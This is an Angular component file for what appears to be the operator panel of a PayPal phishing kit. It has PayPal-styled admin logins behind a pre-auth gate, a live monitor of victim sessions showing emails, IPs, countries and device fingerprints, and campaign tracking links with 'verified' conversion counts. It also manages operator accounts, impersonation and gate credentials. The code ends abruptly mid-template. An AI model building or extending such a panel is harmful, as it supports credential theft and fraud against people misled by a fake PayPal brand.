
import { Component, inject, computed, signal, effect, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { StateService, SessionHistory } from '../services/state.service';
import { AuthService } from '../services/auth.service';
import { ModalService } from '../services/modal.service';
import { TranslationService } from '../services/translation.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { COUNTRIES } from '../utils/country-data';
import { LANG_NAMES } from '../utils/language-map';

type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';

@Component({
  selector: 'app-admin-dashboard',
  standalone: true,
  imports: [CommonModule, FormsModule, TranslatePipe],
  template: `
    <div class="flex h-[100dvh] flex-col lg:flex-row bg-pp-bg dark:bg-slate-900 font-sans text-pp-navy dark:text-slate-100 overflow-hidden">
      
      <!-- Toast Notification -->
      @if (state.adminToast()) {
          <div class="fixed top-6 right-6 z-[100] bg-pp-navy text-white px-6 py-3 rounded-full shadow-2xl flex items-center gap-3 animate-fade-in">
              <span class="material-icons text-pp-success text-lg">check_circle</span>
              <span class="text-sm font-bold">{{ state.adminToast() }}</span>
          </div>
      }

      <!-- AUTH GUARD -->
      @if (!auth.isAuthenticated()) {
         <div class="absolute inset-0 z-[200] bg-pp-bg flex items-center justify-center p-4">

             @if (!preAuthSuccess()) {
                 <!-- Level 1: Pre-Auth Gate (Distinct UI) -->
                 <div class="pp-card max-w-[400px] bg-slate-900 text-white border-slate-700 shadow-2xl">
                    <div class="flex justify-center mb-8">
                         <div class="w-16 h-16 rounded-full bg-red-600/20 flex items-center justify-center">
                             <span class="material-icons text-3xl text-red-500">security</span>
                         </div>
                    </div>
                    <h2 class="text-xl font-mono font-bold text-center mb-2 tracking-widest uppercase text-red-500">Access Control</h2>
                    <p class="text-center text-xs text-slate-400 mb-8 font-mono">Restricted Environment. Authorized Personnel Only.</p>

                    <div class="space-y-5">
                        <div class="relative">
                            <input type="text" [(ngModel)]="preAuthUser" placeholder=" " class="block px-2.5 pb-2.5 pt-4 w-full text-sm text-white bg-slate-800 rounded-lg border-1 border-slate-600 appearance-none focus:outline-none focus:ring-0 focus:border-red-500 peer">
                            <label class="absolute text-sm text-slate-400 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-slate-800 px-2 peer-focus:px-2 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1">Operator ID</label>
                        </div>
                        <div class="relative">
                            <input type="password" [(ngModel)]="preAuthPass" placeholder=" " class="block px-2.5 pb-2.5 pt-4 w-full text-sm text-white bg-slate-800 rounded-lg border-1 border-slate-600 appearance-none focus:outline-none focus:ring-0 focus:border-red-500 peer">
                            <label class="absolute text-sm text-slate-400 duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-slate-800 px-2 peer-focus:px-2 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-1">Access Key</label>
                        </div>

                        <button (click)="doPreAuth()" class="w-full text-white bg-red-600 hover:bg-red-700 focus:ring-4 focus:outline-none focus:ring-red-900 font-medium rounded-lg text-sm px-5 py-3 text-center transition-all uppercase tracking-wider font-bold mt-4">
                            Authenticate
                        </button>
                        @if(preAuthError()) { <p class="text-center text-red-400 text-xs font-mono font-bold mt-2 animate-pulse">ACCESS DENIED</p> }
                    </div>
                 </div>
             } @else {
                 <!-- Level 2: Actual Admin Login (PayPal Style) -->
                 <div class="pp-card max-w-[400px] animate-fade-in">
                    <div class="flex justify-center mb-8">
                         <h1 class="text-3xl font-bold text-pp-navy tracking-tighter">PayPal <span class="text-pp-blue">Admin</span></h1>
                    </div>
                    <h2 class="text-xl font-bold text-center mb-6">Security Console</h2>
                    <div class="space-y-5">
                        <div class="pp-input-group mb-0">
                            <input type="text" [(ngModel)]="loginUser" placeholder=" " class="pp-input peer">
                            <label class="pp-label">Username</label>
                        </div>
                        <div class="pp-input-group mb-0">
                            <input type="password" [(ngModel)]="loginPass" placeholder=" " class="pp-input peer">
                            <label class="pp-label">Password</label>
                        </div>
                        <button (click)="doLogin()" class="pp-btn mt-4" [disabled]="isLoading()">
                            @if(isLoading()) { <span class="material-icons animate-spin text-sm">refresh</span> }
                            @else { Log In }
                        </button>
                        @if(loginError()) { <p class="text-center text-[#D92D20] text-sm font-bold mt-2">Access Denied</p> }
                    </div>
                 </div>
             }
         </div>
      } @else {

      <!-- SIDEBAR -->
      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy dark:bg-slate-950 text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0">
           <div class="h-16 lg:h-20 flex items-center lg:px-6 lg:border-b border-[#ffffff10]">
              <span class="font-bold text-xl tracking-tight">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
              @if(auth.currentUser()?.role === 'hypervisor') {
                  <span class="ml-2 bg-red-600 text-white text-[9px] px-1.5 py-0.5 rounded font-bold">HV</span>
              }
           </div>
           
           <nav class="flex lg:flex-col items-center lg:items-stretch gap-2 lg:gap-0 lg:py-6">
               <a (click)="activeTab.set('live')" [class.bg-[#ffffff10]]="activeTab() === 'live'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'live'">
                   <span class="material-icons text-[20px]">radar</span>
                   <span class="hidden lg:block">{{ 'LIVE_MONITOR' | translate }}</span>
                   @if(state.activeSessions().length > 0) {
                       <span class="hidden lg:flex ml-auto bg-pp-success text-pp-navy text-[10px] font-bold px-2 py-0.5 rounded-full">{{ state.activeSessions().length }}</span>
                   }
               </a>
               <a (click)="activeTab.set('history')" [class.bg-[#ffffff10]]="activeTab() === 'history'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'history'">
                   <span class="material-icons text-[20px]">history</span>
                   <span class="hidden lg:block">{{ 'HISTORY' | translate }}</span>
               </a>

               <a (click)="activeTab.set('links')" [class.bg-[#ffffff10]]="activeTab() === 'links'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'links'">
                   <span class="material-icons text-[20px]">link</span>
                   <span class="hidden lg:block">{{ 'TRACKING_LINKS' | translate }}</span>
               </a>

               @if(auth.currentUser()?.role === 'hypervisor') {
                   <a (click)="activeTab.set('system')" [class.bg-[#ffffff10]]="activeTab() === 'system'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'system'">
                       <span class="material-icons text-[20px]">dns</span>
                       <span class="hidden lg:block">{{ 'SYSTEM' | translate }}</span>
                   </a>
                   <a (click)="activeTab.set('users')" [class.bg-[#ffffff10]]="activeTab() === 'users'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'users'">
                       <span class="material-icons text-[20px]">group</span>
                       <span class="hidden lg:block">{{ 'ADMINS' | translate }}</span>
                   </a>
               }

               <a (click)="activeTab.set('settings')" [class.bg-[#ffffff10]]="activeTab() === 'settings'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'settings'">
                   <span class="material-icons text-[20px]">settings</span>
                   <span class="hidden lg:block">{{ 'SETTINGS' | translate }}</span>
               </a>
           </nav>

           <div class="hidden lg:block p-4 border-t border-[#ffffff10] mt-auto">
               <button (click)="exitAdmin()" class="flex items-center gap-4 text-white/60 hover:text-white w-full">
                   <span class="material-icons">logout</span>
                   <span class="text-sm font-bold">{{ 'LOG_OUT' | translate }}</span>
               </button>
           </div>

           <button (click)="exitAdmin()" class="lg:hidden text-white/60 hover:text-white">
               <span class="material-icons">logout</span>
           </button>
      </aside>

      <!-- MAIN CONTENT -->
      <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg dark:bg-slate-900 overflow-hidden">
         
         @if (auth.currentUser()?.isImpersonated) {
             <div class="bg-orange-500 text-white text-xs font-bold px-4 py-2 flex justify-between items-center z-50 shadow-md">
                 <div class="flex items-center gap-2">
                     <span class="material-icons text-sm animate-pulse">visibility</span>
                     <span>IMPERSONATING: {{ auth.currentUser()?.username }}</span>
                 </div>
                 <button (click)="exitImpersonation()" class="bg-white/20 hover:bg-white/30 text-white px-3 py-1 rounded uppercase tracking-wider transition-colors flex items-center gap-1">
                     <span class="material-icons text-xs">logout</span> Exit View
                 </button>
             </div>
         }

         <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
             <div class="flex items-center gap-2">
                 <h1 class="text-lg font-bold text-pp-navy dark:text-white">
                     @if(auth.currentUser()?.role === 'hypervisor') { {{ 'HYPERVISOR_CONSOLE' | translate }} } @else { {{ 'ADMIN_DASHBOARD' | translate }} }
                 </h1>
                 @if(state.isOfflineMode()) {
                     <span class="bg-amber-100 text-amber-800 text-[10px] font-bold px-2 py-1 rounded-full uppercase tracking-wider flex items-center gap-1">
                         <span class="material-icons text-[12px]">wifi_off</span> {{ 'LOCAL_MODE' | translate }}
                     </span>
                 }
             </div>
             <div class="flex items-center gap-4">
                 <div class="text-right">
                     <p class="text-xs font-bold text-pp-navy dark:text-white">{{ auth.currentUser()?.username }}</p>
                     <p class="text-[10px] text-slate-400 uppercase">{{ auth.currentUser()?.role }}</p>
                 </div>
                 <div class="w-8 h-8 rounded-full bg-pp-navy text-white flex items-center justify-center font-bold text-xs uppercase">
                     {{ auth.currentUser()?.username?.substring(0, 2) || 'AD' }}
                 </div>
             </div>
         </header>

         <div class="flex-1 overflow-hidden relative">
            
            @switch (activeTab()) {
                
                @case ('live') {
                    <div class="flex flex-col lg:flex-row h-full">
                        <div class="lg:w-[350px] bg-white dark:bg-slate-800 border-b lg:border-b-0 lg:border-r border-slate-200 dark:border-slate-700 flex flex-col shrink-0 h-[300px] lg:h-full">
                             <div class="p-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex justify-between items-center shrink-0">
                                 <h3 class="font-bold text-base text-pp-navy dark:text-white">{{ 'ACTIVE_SESSIONS' | translate }}</h3>
                                 <div class="flex items-center gap-2">
                                     <button (click)="refresh()" class="p-1.5 text-pp-blue bg-blue-50 dark:bg-blue-900/30 rounded-lg hover:bg-blue-100 dark:hover:bg-blue-900/50 transition-colors" title="Refresh">
                                         <span class="material-icons text-sm">refresh</span>
                                     </button>
                                     <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
                                 </div>
                             </div>

                             <div class="flex-1 overflow-y-auto p-2 space-y-2 dark:bg-slate-800">
                                 @for(session of state.activeSessions(); track session.id) {
                                     <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-transparent group relative"
                                          [class.bg-[#E1F0FA]]="isSelected(session)"
                                          [class.dark:bg-slate-700]="isSelected(session)"
                                          [class.border-pp-blue]="isSelected(session)"
                                          [class.hover:bg-slate-50]="!isSelected(session)"
                                          [class.dark:hover:bg-slate-700]="!isSelected(session)">
                                         
                                         <div class="absolute top-3 right-3 h-2 w-2 rounded-full"
                                            [class.bg-pp-success]="isSessionLive(session)"
                                            [class.bg-slate-300]="!isSessionLive(session)"></div>

                                         <div class="flex flex-col gap-0.5">
                                             <div class="flex items-center gap-2">
                                                @if(getDeviceImage(session.fingerprint?.userAgent)) {
                                                    <img [src]="getDeviceImage(session.fingerprint?.userAgent)" class="h-3 w-3 object-contain dark:invert opacity-70">
                                                } @else {
                                                    <span class="material-icons text-slate-400 text-[14px]">{{ getDeviceIcon(session.fingerprint?.userAgent) }}</span>
                                                }
                                                <span class="font-bold text-pp-navy dark:text-white font-mono text-xs">{{ session.ip || session.fingerprint?.ip || session.id }}</span>
                                                @if(session.data?.ipCountry) {
                                                    <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]">
                                                }
                                             </div>
                                             <div class="flex items-center justify-between w-full relative">
                                                <span class="text-sm font-bold text-slate-700 dark:text-slate-300 truncate max-w-[140px]">{{ getDisplayEmail(session.email) }}</span>

                                                <div class="flex items-center gap-1 absolute right-0 bottom-0 bg-white/80 dark:bg-slate-700/80 pl-2 backdrop-blur-sm opacity-0 group-hover:opacity-100 transition-opacity" (click)="$event.stopPropagation()">
                                                    <button (click)="state.pinSession(session.id)" class="text-slate-400 hover:text-pp-blue" [class.text-pp-blue]="session.isPinned">
                                                        <span class="material-icons text-[14px]">push_pin</span>
                                                    </button>
                                                    <button (click)="state.deleteSession(session.id)" class="text-slate-400 hover:text-red-500">
                                                        <span class="material-icons text-[14px]">delete</span>
                                                    </button>
                                                </div>

                                                @if(getActionBadge(session)) {
                                                    <span class="bg-red-500 text-white text-[9px] font-bold px-1.5 py-0.5 rounded animate-pulse ml-2 whitespace-nowrap group-hover:opacity-0 transition-opacity">
                                                        {{ getActionBadge(session) }}
                                                    </span>
                                                }
                                             </div>
                                         </div>
                                     </div>
                                     }
                                     @if(state.activeSessions().length === 0) {
                                         <div class="flex flex-col items-center justify-center h-24 text-slate-400">
                                             <p class="text-xs">{{ 'NO_ONLINE_USERS' | translate }}</p>
                                         </div>
                                     }
                                 </div>

                             <div class="h-[40%] flex flex-col border-t border-slate-200 dark:border-slate-700">
                                 <div (click)="incompleteCollapsed.set(!incompleteCollapsed())" class="p-3 bg-slate-100 dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 flex justify-between items-center cursor-pointer hover:bg-slate-200 dark:hover:bg-slate-800 transition-colors">
                                     <div class="flex items-center gap-2">
                                         <span class="material-icons text-slate-400 text-sm transform transition-transform" [class.-rotate-90]="incompleteCollapsed()">expand_more</span>
                                         <h3 class="font-bold text-sm text-slate-600 dark:text-slate-300">{{ 'INCOMPLETE' | translate }}</h3>
                                     </div>
                                     <span class="bg-slate-300 text-slate-700 text-[10px] px-2 py-0.5 rounded-full font-bold">{{ state.incompleteSessions().length }}</span>
                                 </div>

                                 <div class="flex-1 overflow-y-auto p-2 space-y-2 bg-slate-50 dark:bg-slate-800" [class.hidden]="incompleteCollapsed()">
                                     @for(session of state.incompleteSessions(); track session.id) {
                                         <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-slate-200 dark:border-slate-600 bg-white dark:bg-slate-700 opacity-80 hover:opacity-100"
                                              [class.border-pp-blue]="isSelected(session)" [class.ring-1]="isSelected(session)" [class.ring-pp-blue]="isSelected(session)">

                                             <div class="flex items-center justify-between mb-1">
                                                <span class="font-bold text-slate-500 dark:text-slate-400 font-mono text-xs">{{ session.id }}</span>
                                                <span class="text-[10px] font-bold text-slate-400 uppercase">Offline</span>
                                             </div>
                                             <div class="flex flex-col gap-0.5">
                                                 <span class="text-sm font-bold text-slate-700 dark:text-slate-200 truncate">{{ getDisplayEmail(session.email) }}</span>
                                                 <div class="flex justify-between items-center mt-2">
                                                     <span class="text-[10px] text-slate-400">{{ session.stage }}</span>
                                                     <button (click)="archiveSession(session, $event)" class="text-[10px] font-bold text-pp-blue hover:underline bg-blue-50 dark:bg-slate-600 dark:text-white px-2 py-1 rounded">Archive</button>
                                                 </div>
                                             </div>
                                         </div>
                                     }
                                     @if(state.incompleteSessions().length === 0) {
                                         <div class="flex flex-col items-center justify-center h-full text-slate-400">
                                             <p class="text-xs">{{ 'NO_INCOMPLETE_SESSIONS' | translate }}</p>
                                         </div>
                                     }
                                 </div>
                             </div>
                        </div>

                        <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] dark:bg-slate-900 relative">
                             @if(monitoredSession()) {
                                 <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: monitoredSession(), isHistory: false}"></ng-container>
                             } @else {
                                 <div class="flex-1 flex flex-col items-center justify-center text-slate-300 min-h-[300px]">
                                     <span class="material-icons text-6xl mb-4 opacity-20">touch_app</span>
                                     <p class="text-lg font-bold">Select a session</p>
                                     <p class="text-sm">Choose an active session from the left to monitor.</p>
                                 </div>
                             }
                        </div>
                    </div>
                }

                @case ('links') {
                    <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col p-6">
                        <div class="flex justify-between items-center mb-6">
                            <div>
                                <h2 class="font-bold text-xl text-pp-navy dark:text-white">{{ 'LINK_MANAGEMENT' | translate }}</h2>
                                <p class="text-xs text-slate-500">Create unique tracking links for your campaigns.</p>
                            </div>
                            <button (click)="generateLink()" class="bg-pp-blue text-white px-4 py-2 rounded-lg font-bold text-xs flex items-center gap-2 hover:bg-[#005ea6] transition-colors shadow-button">
                                <span class="material-icons text-sm">add_link</span> {{ 'GENERATE_NEW_LINK' | translate }}
                            </button>
                        </div>

                        <div class="flex-1 overflow-auto">
                            <table class="w-full text-left border-collapse">
                                <thead class="bg-slate-50 dark:bg-slate-900 text-slate-500 text-xs font-bold uppercase">
                                    <tr>
                                        <th class="px-4 py-3 rounded-l-lg">{{ 'CODE' | translate }}</th>
                                        <th class="px-4 py-3">{{ 'LINK_URL' | translate }}</th>
                                        <th class="px-4 py-3 text-center">{{ 'CLICKS' | translate }}</th>
                                        <th class="px-4 py-3 text-center">{{ 'SESSIONS' | translate }}</th>
                                        <th class="px-4 py-3 text-center">{{ 'VERIFIED' | translate }}</th>
                                        <th class="px-4 py-3 text-right">{{ 'CONVERSION' | translate }}</th>
                                        <th class="px-4 py-3 text-right rounded-r-lg">{{ 'ACTIONS' | translate }}</th>
                                    </tr>
                                </thead>
                                <tbody class="text-sm font-medium text-pp-navy dark:text-white divide-y divide-slate-100 dark:divide-slate-700">
                                    @for(link of linkList(); track link.code) {
                                        <tr [ngClass]="{'bg-blue-50': isDefaultLink(link.code), 'dark:bg-blue-900/10': isDefaultLink(link.code)}">
                                            <td class="px-4 py-3 font-mono text-xs font-bold" [class.text-pp-blue]="isDefaultLink(link.code)">{{ link.code }}</td>
                                            <td class="px-4 py-3 text-xs text-slate-500 truncate max-w-[200px]">{{ getLinkUrl(link.code) }}</td>
                                            <td class="px-4 py-3 text-center font-bold">{{ link.clicks }}</td>
                                            <td class="px-4 py-3 text-center">{{ link.sessions_started }}</td>
                                            <td class="px-4 py-3 text-center text-green-600 font-bold">{{ link.sessions_verified }}</td>
                                            <td class="px-4 py-3 text-right text-xs">
                                                @if(link.clicks > 0) {
                                                    <span class="bg-green-100 text-green-800 px-2 py-0.5 rounded font-bold">{{ ((link.sessions_verified / link.clicks) * 100).toFixed(1) }}%</span>
                                                } @else {
                                                    <span class="text-slate-300">0%</span>
                                                }
                                            </td>
                                            <td class="px-4 py-3 text-right flex justify-end items-center gap-3">
                                                <button (click)="copy(getLinkUrl(link.code))" class="text-pp-blue hover:underline text-[10px] font-bold flex items-center gap-1">
                                                    <span class="material-icons text-xs">content_copy</span> {{ 'COPY' | translate }}
                                                </button>
                                                @if(isDefaultLink(link.code)) {
                                                    <span class="text-[9px] uppercase font-bold bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">{{ 'DEFAULT' | translate }}</span>
                                                } @else {
                                                    <button (click)="deleteLink(link.code)" class="text-red-500 hover:text-red-700 text-[10px] font-bold flex items-center gap-1">
                                                        <span class="material-icons text-xs">delete</span>
                                                    </button>
                                                }
                                            </td>
                                        </tr>
                                    }
                                </tbody>
                            </table>
                        </div>
                    </div>
                }

                @case ('system') {
                    <div class="h-full overflow-y-auto p-6 space-y-6">
                        <div class="grid grid-cols-4 gap-4">
                            <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'TOTAL_SESSIONS' | translate }}</p>
                                <p class="text-2xl font-bold text-pp-navy dark:text-white mt-1">{{ kpiStats().total }}</p>
                            </div>
                            <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'ACTIVE_NOW' | translate }}</p>
                                <p class="text-2xl font-bold text-pp-blue mt-1">{{ kpiStats().active }}</p>
                            </div>
                            <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'VERIFIED' | translate }}</p>
                                <p class="text-2xl font-bold text-green-600 mt-1">{{ kpiStats().verified }}</p>
                            </div>
                            <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'LINK_CLICKS' | translate }}</p>
                                <p class="text-2xl font-bold text-slate-600 dark:text-slate-300 mt-1">{{ kpiStats().clicks }}</p>
                            </div>
                        </div>

                        <div class="bg-white dark:bg-slate-800 rounded-xl shadow-sm border border-slate-100 dark:border-slate-700 p-6">
                            <h3 class="font-bold text-sm text-pp-navy dark:text-white uppercase tracking-wider mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">{{ 'ACCESS_CONTROL' | translate }}</h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div class="pp-input-group mb-0">
                                    <input type="text" [(ngModel)]="gateUser" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'GATE_USER' | translate }}</label>
                                </div>
                                <div class="pp-input-group mb-0">
                                    <input type="text" [(ngModel)]="gatePass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'GATE_PASSWORD' | translate }}</label>
                                </div>
                            </div>
                            <div class="mt-4 flex justify-end">
                                <button (click)="saveGateSettings()" class="bg-slate-900 text-white px-4 py-2 rounded-lg font-bold text-xs uppercase hover:bg-slate-800 transition-colors">
                                    {{ 'UPDATE_CREDENTIALS' | translate }}
                                </button>
                            </div>
                        </div>

                        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[400px]">
                            <div class="bg-[#1e1e1e] rounded-xl overflow-hidden flex flex-col shadow-lg border border-slate-700">
                                <div class="bg-[#2d2d2d] px-4 py-2 border-b border-slate-600 flex justify-between items-center">
                                    <span class="text-xs font-bold text-slate-300 uppercase flex items-center gap-2">
                                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span> {{ 'LIVE_SERVER_LOGS' | translate }}
                                    </span>
                                    <button (click)="systemLogs.set([])" class="text-[10px] text-slate-400 hover:text-white uppercase font-bold">{{ 'CLEAR' | translate }}</button>
                                </div>
                                <div class="flex-1 overflow-y-auto p-4 font-mono text-xs space-y-1">
                                    @for(log of systemLogs(); track log.timestamp) {
                                        <div class="flex gap-2">
                                            <span class="text-slate-500">[{{ log.timestamp | date:'HH:mm:ss' }}]</span>
                                            <span [class.text-red-400]="log.type === 'error'" [class.text-green-400]="log.type === 'log'" class="break-all">{{ log.msg }}</span>
                                        </div>
                                    }
                                </div>
                            </div>

                            <div class="bg-white dark:bg-slate-800 rounded-xl overflow-hidden flex flex-col shadow-sm border border-slate-100 dark:border-slate-700">
                                <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50">
                                    <h3 class="font-bold text-pp-navy dark:text-white">{{ 'AUDIT_LOG' | translate }}</h3>
                                </div>
                                <div class="flex-1 overflow-y-auto">
                                    <table class="w-full text-left text-xs">
                                        <thead class="bg-slate-50 dark:bg-slate-900 text-slate-500 font-bold uppercase sticky top-0">
                                            <tr>
                                                <th class="px-4 py-2">Time</th>
                                                <th class="px-4 py-2">Actor</th>
                                                <th class="px-4 py-2">Action</th>
                                                <th class="px-4 py-2">Details</th>
                                            </tr>
                                        </thead>
                                        <tbody class="divide-y divide-slate-100 dark:divide-slate-700 dark:text-slate-300">
                                            @for(log of auditLogs(); track log.id) {
                                                <tr>
                                                    <td class="px-4 py-2 text-slate-400 whitespace-nowrap">{{ log.timestamp | date:'short' }}</td>
                                                    <td class="px-4 py-2 font-bold">{{ log.actor }}</td>
                                                    <td class="px-4 py-2">
                                                        <span class="bg-slate-100 dark:bg-slate-700 px-2 py-0.5 rounded text-[10px] uppercase font-bold">{{ log.action }}</span>
                                                    </td>
                                                    <td class="px-4 py-2 truncate max-w-[200px]" title="{{log.details}}">{{ log.details }}</td>
                                                </tr>
                                            }
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                }

                @case ('users') {
                    <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col p-6">
                        <div class="flex justify-between items-center mb-6">
                            <h2 class="font-bold text-xl text-pp-navy dark:text-white">Admin Management</h2>
                            <button (click)="openAddUserModal()" class="bg-pp-blue text-white px-4 py-2 rounded-lg font-bold text-xs flex items-center gap-2 hover:bg-[#005ea6] transition-colors">
                                <span class="material-icons text-sm">add</span> {{ 'CREATE_ADMIN' | translate }}
                            </button>
                        </div>

                        <div class="flex-1 overflow-auto">
                            <table class="w-full text-left border-collapse">
                                <thead class="bg-slate-50 dark:bg-slate-900 text-slate-500 text-xs font-bold uppercase">
                                    <tr>
                                        <th class="px-4 py-3 rounded-l-lg">{{ 'USERNAME' | translate }}</th>
                                        <th class="px-4 py-3">{{ 'ROLE' | translate }}</th>
                                        <th class="px-4 py-3">Personal Link</th>
                                        <th class="px-4 py-3">Limits</th>
                                        <th class="px-4 py-3 text-right rounded-r-lg">{{ 'ACTIONS' | translate }}</th>
                                    </tr>
                                </thead>
                                <tbody class="text-sm font-medium text-pp-navy dark:text-white divide-y divide-slate-100 dark:divide-slate-700">
                                    @for(u of userList(); track u.id) {
                                        <tr class="hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors cursor-pointer" (click)="viewAdminDetails(u)">
                                            <td class="px-4 py-3 font-bold text-pp-blue">{{ u.username }}</td>
                                            <td class="px-4 py-3">
                                                <span class="px-2 py-1 rounded text-[10px] font-bold uppercase"
                                                      [class.bg-red-100]="u.role === 'hypervisor'" [class.text-red-700]="u.role === 'hypervisor'"
                                                      [class.bg-blue-100]="u.role === 'admin'" [class.text-blue-700]="u.role === 'admin'">
                                                    {{ u.role }}
                                                </span>
                                            </td>
                                            <td class="px-4 py-3 font-mono text-xs text-slate-500">
                                                /?id={{ u.uniqueCode }}
                                            </td>
                                            <td class="px-4 py-3 font-mono text-xs">
                                                <div class="flex items-center gap-2">
                                                    <span class="bg-slate-100 dark:bg-slate-700 px-2 py-0.5 rounded">{{ u.maxLinks || 1 }} Links</span>
                                                    <span class="px-2 py-0.5 rounded text-[9px] font-bold uppercase" [class.bg-green-100]="!u.isSuspended" [class.text-green-700]="!u.isSuspended" [class.bg-red-100]="u.isSuspended" [class.text-red-700]="u.isSuspended">
                                                        {{ u.isSuspended ? 'SUSPENDED' : 'ACTIVE' }}
                                                    </span>
                                                </div>
                                            </td>
                                            <td class="px-4 py-3 text-right">
                                                <button class="text-slate-400 hover:text-pp-blue transition-colors">
                                                    <span class="material-icons text-sm">chevron_right</span>
                                                </button>
                                            </td>
                                        </tr>
                                    }
                                </tbody>
                            </table>
                        </div>
                    </div>
                }

                @case ('history') {
                    <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col">
                        <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
                            <h3 class="font-bold text-lg text-pp-navy dark:text-white shrink-0 hidden md:block">{{ 'HISTORY' | translate }}</h3>

                            @if(selectedSessionIds().size > 0) {
                                <div class="flex items-center gap-2 bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-600 px-3 py-1.5 rounded-lg shadow-sm animate-fade-in mr-auto md:mr-0">
                                    <span class="text-xs font-bold text-pp-navy dark:text-white whitespace-nowrap">{{ selectedSessionIds().size }} Selected</span>
                                    <div class="h-4 w-[1px] bg-slate-200 dark:bg-slate-600 mx-1"></div>
                                    <button (click)="bulkPin()" class="text-slate-500 hover:text-pp-blue transition-colors" title="Pin/Unpin"><span class="material-icons text-sm">push_pin</span></button>
                                    <button (click)="bulkExport()" class="text-slate-500 hover:text-green-600 transition-colors" title="Export"><span class="material-icons text-sm">download</span></button>
